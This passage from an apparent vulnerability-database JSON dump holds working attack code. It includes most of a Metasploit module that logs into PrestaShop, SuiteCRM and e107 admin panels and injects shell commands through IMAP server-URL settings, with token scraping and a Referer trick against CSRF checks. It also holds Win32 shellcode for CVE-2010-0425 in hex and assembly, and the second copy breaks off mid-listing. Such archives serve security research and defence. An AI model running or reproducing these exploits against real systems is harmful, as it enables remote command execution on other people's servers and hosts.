of redirects that happen, so we automate going through them to get to the login page.\r\n      while res.code == 301 || res.code == 302\r\n        cookie = res.get_cookies\r\n        uri = res.headers['Location']\r\n        vprint_status(\"Redirected to #{uri}\")\r\n        res = send_request_cgi({'uri' => uri})\r\n      end\r\n\r\n      #Tokens are generated for each URL or sub-component, we need valid ones!\r\n      /.*token=(?<token>\\w{32})/ =~ uri\r\n      /id=\"redirect\" value=\"(?<redirect>.*)\"\\/>/ =~ res.body\r\n      cookie = res.get_cookies\r\n\r\n      unless token && redirect\r\n        print_error('Unable to find token and redirect URL, check options.')\r\n        return\r\n      end\r\n\r\n      vprint_status(\"Token: #{token} and Login Redirect: #{redirect}\")\r\n      print_status(\"Logging in with #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\r\n      res = send_request_cgi(\r\n        'method' => 'POST',\r\n        'uri'    => normalize_uri(target_uri.path, 'index.php'),\r\n        'cookie' => cookie,\r\n        'vars_post' => {\r\n          'ajax' => 1,\r\n          'token' => '',\r\n          'controller' => 'AdminLogin',\r\n          'submitLogin' => '1',\r\n          'passwd' => datastore['PASSWORD'],\r\n          'email' => datastore['USERNAME'],\r\n          'redirect' => redirect\r\n        },\r\n        'vars_get' => {\r\n          'rand' => '1542582364810' #not sure if this will hold true forever, I didn't see where it is being generated\r\n        }\r\n      )\r\n      if res && res.body.include?('Invalid password')\r\n        print_error('Invalid Login')\r\n        return\r\n      end\r\n      vprint_status(\"Login JSON Response: #{res.body}\")\r\n      uri = JSON.parse(res.body)['redirect']\r\n      cookie = res.get_cookies\r\n      print_good('Login Success, loading admin dashboard to pull tokens')\r\n      res = send_request_cgi({'uri' => uri, 'cookie' => cookie})\r\n\r\n      /AdminCustomerThreads&token=(?<token>\\w{32})/ =~ res.body\r\n      vprint_status(\"Customer Threads Token: #{token}\")\r\n      res = send_request_cgi({\r\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\r\n        'cookie' => cookie,\r\n        'vars_get' => {\r\n          'controller' => 'AdminCustomerThreads',\r\n          'token' => token\r\n        }\r\n      })\r\n\r\n      /form method=\"post\" action=\"index\\.php\\?controller=AdminCustomerThreads&token=(?<token>\\w{32})/ =~ res.body\r\n      print_good(\"Sending Payload with Final Token: #{token}\")\r\n      data = Rex::MIME::Message.new\r\n      data.add_part('1', nil, nil, 'form-data; name=\"PS_CUSTOMER_SERVICE_FILE_UPLOAD\"')\r\n      data.add_part(\"Dear Customer,\\n\\nRegards,\\nCustomer service\", nil, nil, 'form-data; name=\"PS_CUSTOMER_SERVICE_SIGNATURE_1\"')\r\n      data.add_part(\"x #{command}}\", nil, nil, 'form-data; name=\"PS_SAV_IMAP_URL\"')\r\n      data.add_part('143', nil, nil, 'form-data; name=\"PS_SAV_IMAP_PORT\"')\r\n      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, 'form-data; name=\"PS_SAV_IMAP_USER\"')\r\n      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, 'form-data; name=\"PS_SAV_IMAP_PWD\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_DELETE_MSG\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_CREATE_THREADS\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_POP3\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NORSH\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_SSL\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_VALIDATE-CERT\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NOVALIDATE-CERT\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_TLS\"')\r\n      data.add_part('0', nil, nil, 'form-data; name=\"PS_SAV_IMAP_OPT_NOTLS\"')\r\n      data.add_part('', nil, nil, 'form-data; name=\"submitOptionscustomer_thread\"')\r\n\r\n      send_request_cgi(\r\n        'method' => 'POST',\r\n        'uri'    => normalize_uri(target_uri.path, 'index.php'),\r\n        'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\r\n        'data'   => data.to_s,\r\n        'cookie' => cookie,\r\n        'vars_get' => {\r\n          'controller' => 'AdminCustomerThreads',\r\n          'token' => token\r\n        }\r\n      )\r\n      print_status('IMAP server change left on server, manual revert required.')\r\n\r\n      if res && res.body.include?('imap Is Not Installed On This Server')\r\n        print_error('PHP IMAP mod not installed/enabled ')\r\n      end\r\n    elsif target.name =~ /suitecrm/\r\n      #login page GET /index.php?action=Login&module=Users\r\n      vprint_status('Loading login page')\r\n      res = send_request_cgi(\r\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\r\n        'vars_get' => {\r\n          'action' => 'Login',\r\n          'module' => 'Users'\r\n        }\r\n      )\r\n      unless res\r\n        print_error('Error loading site.  Check options.')\r\n        return\r\n      end\r\n\r\n      if res.code = 200\r\n        cookie = res.get_cookies\r\n      else\r\n        print_error(\"HTTP code #{res.code} found, check options.\")\r\n        return\r\n      end\r\n\r\n      vprint_status(\"Logging in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\r\n      res = send_request_cgi(\r\n        'method' => 'POST',\r\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\r\n        'cookie' => cookie,\r\n        'vars_post' => {\r\n          'module' => 'Users',\r\n          'action' => 'Authenticate',\r\n          'return_module' => 'Users',\r\n          'return_action' => 'Login',\r\n          'cant_login' => '',\r\n          'login_module' => '',\r\n          'login_action' => '',\r\n          'login_record' => '',\r\n          'login_token' => '',\r\n          'login_oauth_token' => '',\r\n          'login_mobile' => '',\r\n          'user_name' => datastore['USERNAME'],\r\n          'username_password' => datastore['PASSWORD'],\r\n          'Login' => 'Log+In'\r\n        }\r\n      )\r\n      unless res\r\n        print_error('Error loading site.  Check options.')\r\n        return\r\n      end\r\n\r\n      if res.code = 302\r\n        cookie = res.get_cookies\r\n        print_good('Login Success')\r\n      else\r\n        print_error('Failed Login, check options.')\r\n      end\r\n\r\n      #load the email settings page to get the group_id\r\n      vprint_status('Loading InboundEmail page')\r\n      res = send_request_cgi(\r\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\r\n        'cookie' => cookie,\r\n        'vars_get' => {\r\n          'module' => 'InboundEmail',\r\n          'action' => 'EditView'\r\n        }\r\n      )\r\n\r\n      unless res\r\n        print_error('Error loading site.')\r\n        return\r\n      end\r\n\r\n      /\"group_id\" value=\"(?<group_id>\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\">/ =~ res.body\r\n\r\n      unless group_id\r\n        print_error('Could not identify group_id from form page')\r\n        return\r\n      end\r\n\r\n      print_good(\"Sending payload with group_id #{group_id}\")\r\n\r\n      referer = \"http://#{datastore['RHOST']}#{normalize_uri(target_uri.path, 'index.php')}?module=InboundEmail&action=EditView\"\r\n      res = send_request_cgi(\r\n        'method' => 'POST',\r\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\r\n        'cookie' => cookie,\r\n        #required to prevent CSRF protection from triggering\r\n        'headers' => { 'Referer' => referer},\r\n        'vars_post' => {\r\n          'module' => 'InboundEmail',\r\n          'record' => '',\r\n          'origin_id' => '',\r\n          'isDuplicate' => 'false',\r\n          'action' => 'Save',\r\n          'group_id' => group_id,\r\n          'return_module' => '',\r\n          'return_action' => '',\r\n          'return_id' => '',\r\n          'personal' => '',\r\n          'searchField' => '',\r\n          'mailbox_type' => '',\r\n          'button' => '  Save  ',\r\n          'name' => Rex::Text.rand_text_alphanumeric(8),\r\n          'status' => 'Active',\r\n          'server_url' => \"x #{command}}\",\r\n          'email_user' => Rex::Text.rand_text_alphanumeric(8),\r\n          'protocol' => 'imap',\r\n          'email_password' => Rex::Text.rand_text_alphanumeric(8),\r\n          'port' => '143',\r\n          'mailbox' => 'INBOX',\r\n          'trashFolder' => 'TRASH',\r\n          'sentFolder' => '',\r\n          'from_name' => Rex::Text.rand_text_alphanumeric(8),\r\n          'is_auto_import' => 'on',\r\n          'from_addr' => \"#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org\",\r\n          'reply_to_name' => '',\r\n          'distrib_method' => 'AOPDefault',\r\n          'distribution_user_name' => '',\r\n          'distribution_user_id' => '',\r\n          'distribution_options[0]' => 'all',\r\n          'distribution_options[1]' => '',\r\n          'distribution_options[2]' => '',\r\n          'create_case_template_id' => '',\r\n          'reply_to_addr' => '',\r\n          'template_id' => '',\r\n          'filter_domain' => '',\r\n          'email_num_autoreplies_24_hours' => '10',\r\n          'leaveMessagesOnMailServer' => '1'\r\n        }\r\n      )\r\n      if res && res.code == 200\r\n        print_error('Triggered CSRF protection, may try exploitation manually.')\r\n      end\r\n      print_status('IMAP server config left on server, manual removal required.')\r\n    elsif target.name =~ /e107v2/\r\n      # e107 has an encoder which prevents $IFS$() from being used as $ = &#036;\r\n      # \\t also became /t, however \"\\t\" does seem to work.\r\n\r\n      # e107 also uses a cron job to check bounce jobs, which may not be active.\r\n      # either cron can be disabled, or bounce checks disabled, so we try to\r\n      # kick the process manually, however if it doesn't work we'll hope\r\n      # cron is running and we get a call back anyways.\r\n\r\n      vprint_status(\"Logging in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\r\n      res = send_request_cgi(\r\n        'method' => 'POST',\r\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'admin.php'),\r\n        'vars_post' => {\r\n          'authname' => datastore['USERNAME'],\r\n          'authpass' => datastore['PASSWORD'],\r\n          'authsubmit' => 'Log In'\r\n      })\r\n      unless res\r\n        print_error('Error loading site.  Check options.')\r\n        return\r\n      end\r\n\r\n      if res.code == 302\r\n        cookie = res.get_cookies\r\n        print_good('Login Success')\r\n      else\r\n        print_error('Failed Login, check options.')\r\n      end\r\n\r\n\r\n      vprint_status('Checking if Cron is enabled for triggering')\r\n      res = send_request_cgi(\r\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\r\n        'cookie' => cookie\r\n      )\r\n      unless res\r\n        print_error('Error loading site.  Check options.')\r\n        return\r\n      end\r\n      if res.body.include? 'Status: <b>Disabled</b>'\r\n        print_error('Cron disabled, unexploitable.')\r\n        return\r\n      end\r\n\r\n      print_good('Storing payload in mail settings')\r\n\r\n      # the imap/pop field is hard to find. Check Users > Mail\r\n      # then check \"Bounced emails - Processing method\" and set it to \"Mail account\"\r\n      send_request_cgi(\r\n        'method' => 'POST',\r\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'mailout.php'),\r\n        'cookie' => cookie,\r\n        'vars_get' => {\r\n          'mode' => 'prefs',\r\n          'action' => 'prefs'\r\n        },\r\n        'vars_post' => {\r\n          'testaddress' => 'none@none.com',\r\n          'testtemplate' => 'textonly',\r\n          'bulkmailer' => 'smtp',\r\n          'smtp_server' => '1.1.1.1',\r\n          'smtp_username' => 'username',\r\n          'smtp_password' => 'password',\r\n          'smtp_port' => '25',\r\n          'smtp_options' => '',\r\n          'smtp_keepalive' => '0',\r\n          'smtp_useVERP' => '0',\r\n          'mail_sendstyle' => 'texthtml',\r\n          'mail_pause' => '3',\r\n          'mail_pausetime' => '4',\r\n          'mail_workpertick' => '5',\r\n          'mail_log_option' => '0',\r\n          'mail_bounce' => 'mail',\r\n          'mail_bounce_email2' => '',\r\n          'mail_bounce_email' => \"#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org\",\r\n          'mail_bounce_pop3' => \"x #{command(\"\\t\")}}\",\r\n          'mail_bounce_user' => Rex::Text.rand_text_alphanumeric(8),\r\n          'mail_bounce_pass' => Rex::Text.rand_text_alphanumeric(8),\r\n          'mail_bounce_type' => 'imap',\r\n          'mail_bounce_auto' => '1',\r\n          'updateprefs' => 'Save Changes'\r\n      })\r\n\r\n\r\n      vprint_status('Loading cron page to execute job manually')\r\n      res =  send_request_cgi(\r\n        'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\r\n        'cookie' => cookie\r\n      )\r\n\r\n      unless res\r\n        print_error('Error loading site.  Check options.')\r\n        return\r\n      end\r\n\r\n      if /name='e-token' value='(?<etoken>\\w{32})'/ =~ res.body && /_system::procEmailBounce.+?cron_execute\\[(?<cron_id>\\d)\\]/m =~ res.body\r\n        print_good(\"Triggering manual run of mail bounch check cron to execute payload with cron id #{cron_id} and etoken #{etoken}\")\r\n        # The post request has several duplicate columns, however all were not required.  Left them commented for documentation purposes\r\n        send_request_cgi(\r\n          'method' => 'POST',\r\n          'uri' => normalize_uri(target_uri.path, 'e107_admin', 'cron.php'),\r\n          'cookie' => cookie,\r\n          'vars_post' => {\r\n            'e-token' => etoken,\r\n            #'e-columns[]' => 'cron_category',\r\n            'e-columns[]' => 'cron_name',\r\n            #'e-columns[]' => 'cron_description',\r\n            #'e-columns[]' => 'cron_function',\r\n            #'e-columns[]' => 'cron_tab',\r\n            #'e-columns[]' => 'cron_lastrun',\r\n            #'e-columns[]' => 'cron_active',\r\n            \"cron_execute[#{cron_id}]\" => '1',\r\n            'etrigger_batch' => ''\r\n        })\r\n\r\n      else\r\n        print_error('e-token not found, required for manual exploitation.  Wait 60sec, cron may still trigger.')\r\n      end\r\n\r\n      print_status('IMAP server config left on server, manual removal required.')\r\n    elsif target.name =~ /custom/\r\n      print_status('Listener started for 300 seconds')\r\n      print_good(\"POST request connection string: x #{command}}\")\r\n      # URI.encode leaves + as + since that's a space encoded.  So we manually change it.\r\n      print_good(\"GET request connection string: #{URI.encode(\"x \" + command + \"}\").sub! '+', '%2B'}\")\r\n    end\r\n  end\r\nend",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:45914"
        }
    ],
    "CVE-2010-0425": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-69341",
            "id": "SSV:69341",
            "title": "Write-to-file Shellcode (Win32)",
            "type": "seebug",
            "sourceData": "\n                                                ; Write-to-file Shellcode\r\n;\r\n; This shellcode was used in the exploit for: CVE-2010-0425\r\n; Supported: Windows 2000, WinXP, Server 2003, Server 2008, Vista, Windows 7\r\n;\r\n; Size: 278 bytes\r\n; ////////////////////////////////////////////////////////////////////////////////\r\n; \\x31\\xc0\\x31\\xc9\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x56\\x08\\x8b\\x7e\\x20\r\n; \\x8b\\x36\\x66\\x39\\x4f\\x14\\x75\\xf2\\x66\\xb9\\x01\\x6d\\x66\\x81\\xe9\\x94\\x6c\\x66\\x39\\x0f\r\n; \\x66\\x89\\xc1\\x75\\xe1\\x89\\xe5\\xeb\\x71\\x60\\x8b\\x6c\\x24\\x24\\x8b\\x45\\x3c\\x8b\\x54\\x05\r\n; \\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\r\n; \\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xcf\\x0d\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\r\n; \\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\r\n; \\xe8\\x89\\x44\\x24\\x1c\\x61\\xc3\\xad\\x50\\x52\\xe8\\xaa\\xff\\xff\\xff\\x89\\x07\\x66\\x81\\xc4\r\n; \\x0c\\x01\\x66\\x81\\xec\\x04\\x01\\x66\\x81\\xc7\\x08\\x01\\x66\\x81\\xef\\x04\\x01\\x39\\xce\\x75\r\n; \\xde\\xc3\\xeb\\x10\\x5e\\x8d\\x7d\\x04\\x89\\xf1\\x80\\xc1\\x0c\\xe8\\xcd\\xff\\xff\\xff\\xeb\\x3b\r\n; \\xe8\\xeb\\xff\\xff\\xff\\x6e\\x7c\\x2e\\xe1\\x1e\\x3c\\x3f\\xd7\\x74\\x1e\\x48\\xcd\\x31\\xd2\\x58\r\n; \\x88\\x50\\x05\\xeb\\x2d\\x31\\xd2\\x59\\x88\\x51\\x01\\xeb\\x2c\\x51\\x50\\xff\\x55\\x04\\xeb\\x2a\r\n; \\x31\\xd2\\x59\\x88\\x51\\x05\\xeb\\x2d\\x51\\x50\\x89\\xc6\\xff\\x55\\x08\\x53\\xff\\x55\\x0c\\xe8\r\n; \\xd1\\xff\\xff\\xff\\x66\\x2e\\x74\\x78\\x74\\x4e\\xe8\\xce\\xff\\xff\\xff\\x77\\x4e\\xe8\\xcf\\xff\r\n; \\xff\\xff\\xe8\\xd1\\xff\\xff\\xff\\x70\\x77\\x6e\\x65\\x64\\x4e\\xe8\\xce\\xff\\xff\\xff\r\n; ////////////////////////////////////////////////////////////////////////////////\r\n;\r\n; Origin: http://www.senseofsecurity.com.au\r\n; Written by Brett Gervasoni (brettg [at] senseofsecurity.com.au)\r\n;\r\n; By default the shellcode will write &#34;pwned&#34; to a text file titled &#34;f.txt&#34; in \r\n; the current working directory. \r\n;\r\n; Editable parameters:\r\n; Line 228: Filename\r\n;           Be sure to update the length on line 185\r\n; Line 232: Access mode\r\n;           Be sure to update the length on line 193\r\n; Line 239: Data (text to be written)\r\n;           Be sure to update the length on line 208\r\n\r\n[SECTION .text]\r\nglobal _start\r\n\r\n_start:\r\n\t; if it matters what is on the stack, then allocate space - otherwise, who cares we are exiting anyway?\r\n\t; save bytes by not including it...\r\n\t;sub esp, 0x0c ; allocate space on the stack for funct addresses\r\n\t\r\n; ======================= Find the base address of msvcrt.dll =======================\r\n\t; By checking if a entry in the InInitializationOrder list has a null byte in position\r\n\t; 20 we can find the base addr of msvcrt.dll on Windows 7 and Vista. \r\n\t; &#34;msvcrt.dll&#34; is equal to 10 bytes, so in unicode, its 20 bytes long. \r\n\t; kernel32.dll can be found in a similar fashion. &#34;kernel32.dll&#34; is 12 bytes long though. \r\n\t; on WinXP the InInitializationOrder list is as follows: ntdll.dll, kernel32.dll, msvcrt.dll\r\n\t; On Windows Server 2003, msvcrt.dll is in position 5 and before this dll is checked, RPCRT4.dll\r\n\t; is checked. Which matches the length of msvcrt.dll, as a result the base address of RPCRT4.dll\r\n\t; is used. Obviously this is no good. To solve this problem i made the shellcode check for the \r\n\t; presents of &#39;m&#39; in position 0 as well . \r\n\txor eax, eax           ; make sure it is 0\r\n\txor ecx, ecx           ; ECX = 0\r\n    mov esi, [fs:ecx+0x30] ; ESI = &(PEB) ([FS:0x30])\r\n    mov esi, [esi+0x0c]    ; ESI = PEB-&#62;Ldr\r\n    mov esi, [esi+0x1c]    ; ESI = PEB-&#62;Ldr.InInitOrder\r\nNextModule:\r\n\tmov edx, [esi+0x08]    ; EDX = InInitOrder[X].base_address\r\n    mov edi, [esi+0x20]    ; EDX = InInitOrder[X].module_name (unicode)\r\n    mov esi, [esi]         ; ESI = InInitOrder[X].flink (next module)\r\n    cmp [edi+10*2], cx     ; modulename[12] == 0 ?\r\n    jne NextModule         ; No: try next module.\r\n\t\r\n\t; extra check to find msvcrt.dll\r\n\tmov cx, 0x6d01         ; m = 0x6d\r\n\tsub cx, 0x6c94\r\n                           ; result is 0x6d (m)\r\n\tcmp [edi], cx          ; modulename[0] == m ?\r\n\tmov cx, ax\r\n\tjne NextModule\r\n\r\n\t; base address of msvcrt.dll is now in edx\r\n\t; update ebp\r\n\tmov ebp, esp\r\n\r\n\tjmp short GetHashesSpring ; using a spring to avoid null bytes\r\n\r\n; ======================= FUNCTIONS =======================\r\n; Export Directory Table method\r\nfind_function:\r\n    pushad\r\n    mov ebp, [esp + 0x24]\r\n    mov eax, [ebp + 0x3c]\r\n    mov edx, [ebp + eax + 0x78]\r\n    add edx, ebp\r\n    mov ecx, [edx + 0x18]\r\n    mov ebx, [edx + 0x20]\r\n    add ebx, ebp\r\nfind_function_loop:\r\n    jecxz find_function_finished\r\n    dec ecx\r\n    mov esi, [ebx + ecx * 4]\r\n    add esi, ebp\r\ncompute_hash:\r\n    xor edi, edi\r\n    xor eax, eax\r\n    cld\r\ncompute_hash_again:\r\n    lodsb\r\n    test al, al\r\n    jz compute_hash_finished\r\n    ror edi, 0xd\r\n    add edi, eax\r\n    jmp short compute_hash_again\r\ncompute_hash_finished:\r\nfind_function_compare:\r\n    cmp edi, [esp + 0x28]\r\n    jnz find_function_loop\r\n    mov ebx, [edx + 0x24]\r\n    add ebx, ebp\r\n    mov cx, [ebx + 2 * ecx]\r\n    mov ebx, [edx + 0x1c]\r\n    add ebx, ebp\r\n    mov eax, [ebx + 4 * ecx]\r\n    add eax, ebp\r\n    mov [esp + 0x1c], eax\r\nfind_function_finished:\r\n    popad\r\n    ret\r\n\r\nResolveSymbolsForDLL:\r\n    lodsd\r\n    push eax                    ; push hashes for find_function\r\n    push edx\r\n    call find_function\r\n    mov [edi], eax              ; save found function address\r\n    ;add sp, 0x08\r\n\tadd sp, 0x10c ; + 268\r\n\tsub sp, 0x104 ; - 260 = 8\r\n    ;add di, 0x04               ; increment edi by 4 (due to function address being saved)\r\n\tadd di, 0x108 ; + 264\r\n\tsub di, 0x104 ; - 260 = 4\r\n    cmp esi, ecx                ; check if esi meets length of hash list\r\n    jne ResolveSymbolsForDLL\r\nResolveSymbolsForDLLComplete:\r\n    ret\r\n\r\n; ====================== / FUNCTIONS ======================\r\n\r\nGetHashesSpring:\r\n\tjmp short GetHashes ; using a spring to avoid null bytes\r\n\r\nHashesReturn: \r\n    pop esi\r\n    lea edi, [ebp + 0x04]\r\n    mov ecx, esi\r\n    add cl, 0x0c              ; length of function hash list\r\n\r\n    call ResolveSymbolsForDLL\r\n\r\n\tjmp short GetFilename\r\n\t\r\nGetHashes:\r\n    call HashesReturn\r\n\t\r\n    ; msvcrt.dll hash list\r\n    ; fopen hash = 0x6E7C2EE1\r\n    db 0x6E\r\n    db 0x7C\r\n    db 0x2E\r\n    db 0xE1\r\n\r\n    ; fprintf hash = 0x1E3C3FD7\r\n    db 0x1E\r\n    db 0x3C\r\n    db 0x3F\r\n    db 0xD7\r\n\t; since the message is small, no need to worry about closing the file\r\n\t; keep the shellcode smaller that way.\r\n\t\r\n\t; exit hash = 0x741E48CD\r\n\tdb 0x74\r\n\tdb 0x1E\r\n\tdb 0x48\r\n\tdb 0xCD\r\n\r\nGetFilenameReturn: \r\n\txor edx, edx ; zero out a reg for nulls\r\n\r\n\tpop eax ; f.txt\r\n\tmov [eax+5], dl ; insert a null byte, &#39;f.txt&#39;\r\n\t\r\n\tjmp short GetFileMode\r\n\r\nGetFileModeReturn:\r\n\txor edx, edx ; zero out a reg for nulls\r\n\r\n\tpop ecx ; w\r\n\tmov [ecx+1], dl ; insert a null byte, &#39;w&#39;\r\n\r\n\tjmp short GetfopenCall ; Now jump to fopen call\r\n\t\r\nfopenCall:\t\r\n\tpush ecx ; &#39;w&#39;\r\n\tpush eax ; push &#39;f.txt&#39;\r\n\tcall [ebp+4]; call fopen\r\n\t\r\n\tjmp short GetfprintfData\r\n\r\nGetfprintfDataReturn:\r\n\txor edx, edx ; zero out a reg for a null\r\n\r\n\tpop ecx ; push data string\r\n\tmov [ecx+5], dl ; insert a null byte\r\n\t\r\n\tjmp short GetfprintfCall\r\n\r\nfprintfCall:\t\r\n\tpush ecx ; data\r\n\tpush eax ; handle\r\n\t\r\n\tmov esi, eax ; we want to keep the handle for close\r\n\t\r\n\tcall [ebp+8] ; call fprintf\r\n\r\n; It needs to either exit, or call fclose to write the buffer to file. \r\nExitProcessCall:\r\n\tpush ebx ; ebx has 00004000 in it - who cares what we give exit?\r\n\r\n\tcall [ebp+0x0c] ; exit\r\n\r\nGetFilename:\r\n\tcall GetFilenameReturn\r\n\tdb &#39;f.txtN&#39; ; filename\r\n\r\nGetFileMode:\r\n\tcall GetFileModeReturn\r\n\tdb &#39;wN&#39; ; file access mode\r\n\r\nGetfopenCall:\r\n\tcall fopenCall\r\n\r\nGetfprintfData:\r\n\tcall GetfprintfDataReturn\r\n\tdb &#39;pwnedN&#39; ; data to be written to file\r\n\r\nGetfprintfCall:\r\n\tcall fprintfCall\n                              ",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:69341"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Write-to-file Shellcode (Win32). CVE-2010-0425. Shellcode exploits for multiple platform",
            "modified": "2010-07-09T00:00:00",
            "published": "2010-07-09T00:00:00",
            "id": "EDB-ID:14288",
            "href": "https://www.exploit-db.com/exploits/14288/",
            "type": "exploitdb",
            "title": "Write-to-file Shellcode Win32",
            "sourceData": "; Write-to-file Shellcode\r\n;\r\n; This shellcode was used in the exploit for: CVE-2010-0425\r\n; Supported: Windows 2000, WinXP, Server 2003, Server 2008, Vista, Windows 7\r\n;\r\n; Size: 278 bytes\r\n; ////////////////////////////////////////////////////////////////////////////////\r\n; \\x31\\xc0\\x31\\xc9\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x56\\x08\\x8b\\x7e\\x20\r\n; \\x8b\\x36\\x66\\x39\\x4f\\x14\\x75\\xf2\\x66\\xb9\\x01\\x6d\\x66\\x81\\xe9\\x94\\x6c\\x66\\x39\\x0f\r\n; \\x66\\x89\\xc1\\x75\\xe1\\x89\\xe5\\xeb\\x71\\x60\\x8b\\x6c\\x24\\x24\\x8b\\x45\\x3c\\x8b\\x54\\x05\r\n; \\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\r\n; \\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xcf\\x0d\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\r\n; \\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\r\n; \\xe8\\x89\\x44\\x24\\x1c\\x61\\xc3\\xad\\x50\\x52\\xe8\\xaa\\xff\\xff\\xff\\x89\\x07\\x66\\x81\\xc4\r\n; \\x0c\\x01\\x66\\x81\\xec\\x04\\x01\\x66\\x81\\xc7\\x08\\x01\\x66\\x81\\xef\\x04\\x01\\x39\\xce\\x75\r\n; \\xde\\xc3\\xeb\\x10\\x5e\\x8d\\x7d\\x04\\x89\\xf1\\x80\\xc1\\x0c\\xe8\\xcd\\xff\\xff\\xff\\xeb\\x3b\r\n; \\xe8\\xeb\\xff\\xff\\xff\\x6e\\x7c\\x2e\\xe1\\x1e\\x3c\\x3f\\xd7\\x74\\x1e\\x48\\xcd\\x31\\xd2\\x58\r\n; \\x88\\x50\\x05\\xeb\\x2d\\x31\\xd2\\x59\\x88\\x51\\x01\\xeb\\x2c\\x51\\x50\\xff\\x55\\x04\\xeb\\x2a\r\n; \\x31\\xd2\\x59\\x88\\x51\\x05\\xeb\\x2d\\x51\\x50\\x89\\xc6\\xff\\x55\\x08\\x53\\xff\\x55\\x0c\\xe8\r\n; \\xd1\\xff\\xff\\xff\\x66\\x2e\\x74\\x78\\x74\\x4e\\xe8\\xce\\xff\\xff\\xff\\x77\\x4e\\xe8\\xcf\\xff\r\n; \\xff\\xff\\xe8\\xd1\\xff\\xff\\xff\\x70\\x77\\x6e\\x65\\x64\\x4e\\xe8\\xce\\xff\\xff\\xff\r\n; ////////////////////////////////////////////////////////////////////////////////\r\n;\r\n; Origin: http://www.senseofsecurity.com.au\r\n; Written by Brett Gervasoni (brettg [at] senseofsecurity.com.au)\r\n;\r\n; By default the shellcode will write \"pwned\" to a text file titled \"f.txt\" in \r\n; the current working directory. \r\n;\r\n; Editable parameters:\r\n; Line 228: Filename\r\n;           Be sure to update the length on line 185\r\n; Line 232: Access mode\r\n;           Be sure to update the length on line 193\r\n; Line 239: Data (text to be written)\r\n;           Be sure to update the length on line 208\r\n\r\n[SECTION .text]\r\nglobal _start\r\n\r\n_start:\r\n\t; if it matters what is on the stack, then allocate space - otherwise, who cares we are exiting anyway?\r\n\t; save bytes by not including it...\r\n\t;sub esp, 0x0c ; allocate space on the stack for funct addresses\r\n\t\r\n; ======================= Find the base address of msvcrt.dll =======================\r\n\t; By checking if a entry in the InInitializationOrder list has a null byte in position\r\n\t; 20 we can find the base addr of msvcrt.dll on Windows 7 and Vista. \r\n\t; \"msvcrt.dll\" is equal to 10 bytes, so in unicode, its 20 bytes long. \r\n\t; kernel32.dll can be found in a similar fashion. \"kernel32.dll\" is 12 bytes long though. \r\n\t; on WinXP the InInitializationOrder list is as follows: ntdll.dll, kernel32.dll, msvcrt.dll\r\n\t; On Windows Server 2003, msvcrt.dll is in position 5 and before this dll is checked, RPCRT4.dll\r\n\t; is checked. Which matches the length of msvcrt.dll, as a result the base address of RPCRT4.dll\r\n\t; is used. Obviously this is no good. To solve this problem i made the shellcode check for the \r\n\t; presents of 'm' in position 0 as well . \r\n\txor eax, eax           ; make sure it is 0\r\n\txor ecx, ecx           ; ECX = 0\r\n    mov esi, [fs:ecx+0x30] ; ESI = &(PEB) ([FS:0x30])\r\n    mov esi, [esi+0x0c]    ; ESI = PEB->Ldr\r\n    mov esi, [esi+0x1c]    ; ESI = 